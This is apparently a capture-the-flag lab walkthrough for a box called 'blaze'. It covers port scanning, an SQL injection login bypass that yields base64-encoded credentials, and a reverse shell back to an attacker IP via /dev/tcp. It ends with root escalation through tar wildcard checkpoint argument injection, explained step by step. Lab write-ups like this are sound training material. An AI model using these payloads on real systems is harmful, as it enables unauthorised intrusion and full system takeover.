## Initial Foothold
Autorecon 192.168.207.10

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
9090/tcp open  http    syn-ack ttl 61 Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://192.168.207.10:9090/
```

Port
- 80(web) - login page at `http://192.168.207.10/login.php`. `admin:admin` did not work. Not susceptible to SQLi. Also, you can't see if you have the wrong username because the error message don't show.
- 9090(web) - login page. Feroxbuster only sends redirection back to login page. Nothing seems exploitable
```
http://192.168.207.10:9090/templates
http://192.168.207.10:9090/modules
http://192.168.207.10:9090/js
http://192.168.207.10:9090/admin
http://192.168.207.10:9090/cache
http://192.168.207.10:9090/@localhost
http://192.168.207.10:9090/login
http://192.168.207.10:9090/shell/index.html
http://192.168.207.10:9090/text/css
http://192.168.207.10:9090/cockpit/static/branding.css
http://192.168.207.10:9090/includes
http://192.168.207.10:9090/blog
...
...
```

Cheated. Apparently I am dead wrong. Port 80 login page is susceptible to SQLi. I just don't know how.
`" OR 1 = 1 -- -` is one of the most recognized widely used initial statements used so it is blocked.

Useful SQLi page `https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/Databases/SQLi`
```
admin'-- -
'OR '' = '
```

We get 
```
james:Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=
cameron:dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy
```

On cyberchef, we decode with base64
```
james:canttouchhhthiss@455152
cameron:thisscanttbetouchedd@455152
```

Both logins failed to login to ssh. We head to web server at port 9090.
Login with james:canttouchhhthiss@455152
Obtained a webshell under `https://192.168.207.10:9090/system/terminal`

Throw the shell back to penelope.
```
bash -c 'exec bash -i &>/dev/tcp/192.168.45.212/9090 <&1'
```

## Privesc

We run sudo -l to realise we have sudo privileges on tar
```
User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

From GTFObins,
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

We need to edit this to fit our privileges
```
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

## Alternative:

We can create a payload in pwn.sh. Then 
```bash
cd /tmp

# payload
cat > pwn.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x pwn.sh

# option-named files (no slashes!)
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh pwn.sh"

# trigger
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *

/bin/bash -p
```

### 1. The shell expands `*` _before_ sudo/tar ever see it

The sudo rule is:

```
(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

The crucial thing: that `*` is a **shell glob**, not something tar handles. When you type `sudo tar -czvf /tmp/backup.tar.gz *`, your shell expands `*` into the list of filenames in the current directory _first_, and only then hands the finished command to sudo. So if `/tmp` contains files named `pwn.sh`, `--checkpoint=1`, and `--checkpoint-action=exec=sh pwn.sh`, the shell rewrites your command into:

```
sudo tar -czvf /tmp/backup.tar.gz --checkpoint=1 "--checkpoint-action=exec=sh pwn.sh" pwn.sh
```

The sudoers rule still "matches" because from sudo's perspective the command is still `/usr/bin/tar -czvf /tmp/backup.tar.gz` followed by whatever the `*` became. sudo doesn't police what the wildcard expands into — that's the whole weakness.

### 2. tar can't tell a filename from an option

This is the second mechanism. To tar, an argument like `--checkpoint=1` _is an option_, regardless of the fact that it came from a glob and is technically a filename on disk. Classic Unix argument parsing treats anything starting with `-` as a flag. tar has no way of knowing "this was a filename the user wanted to archive" versus "this is a flag the user typed." It just sees tokens on its command line and parses left to right.

So your two crafted files get interpreted as:

- `--checkpoint=1` → a real tar feature
- `--checkpoint-action=exec=sh pwn.sh` → another real tar feature

This is **argument injection**: you're smuggling options into a command through data (filenames) that the shell feeds in via the wildcard.

### 3. What `--checkpoint` and `--checkpoint-action` actually do

These are legitimate tar features, not bugs. When tar archives a lot of data, `--checkpoint=N` tells it to print a progress message every N records. `--checkpoint-action=ACTION` says "do something each time you hit a checkpoint" — and one of the allowed actions is `exec=COMMAND`, which runs an arbitrary shell command.

So:

- `--checkpoint=1` → fire a checkpoint after the very first record (i.e. almost immediately)
- `--checkpoint-action=exec=sh pwn.sh` → at that checkpoint, execute `sh pwn.sh`

Because the whole tar process is running as **root** (that's what the sudo rule grants), `sh pwn.sh` also runs as root.

### Putting it together

```
you create crafted filenames  ──▶  shell expands *  ──▶  tar parses them as options  ──▶  tar runs your command as root
```